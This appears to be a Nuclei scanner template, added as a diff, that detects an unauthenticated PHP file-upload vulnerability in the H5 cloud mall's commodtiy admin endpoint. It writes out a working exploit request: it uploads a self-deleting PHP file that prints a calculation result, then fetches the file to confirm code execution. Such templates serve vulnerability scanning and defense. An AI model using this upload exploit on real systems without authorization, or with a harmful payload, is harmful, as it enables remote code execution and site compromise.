@@ -1,0 +1,51 @@
+id: H5-commodtiy-file-upload
+
+info:
+  name: H5云商城 commodtiy 接口未验证文件上传漏洞
+  author: Unknown
+  severity: critical
+  tags: H5 云商城
+
+http:
+- raw:
+  - |
+    POST /admin/commodtiy/file.php?upload=1 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+
+    ------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+    Content-Disposition: form-data; name="file"; filename="1.php"
+    Content-Type: application/octet-stream
+
+    <?php print(111*222);unlink(__FILE__);?>
+    ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
+
+  - |
+    GET /admin/commodtiy/upload/{{uploadfile}} HTTP/1.1
+    Host: {{Hostname}}
+
+  extractors:
+  - type: regex
+    part: body
+    name: uploadfile
+    group: 1
+    regex:
+    - '(\w+\.php)'
+    internal: true
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '24642'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
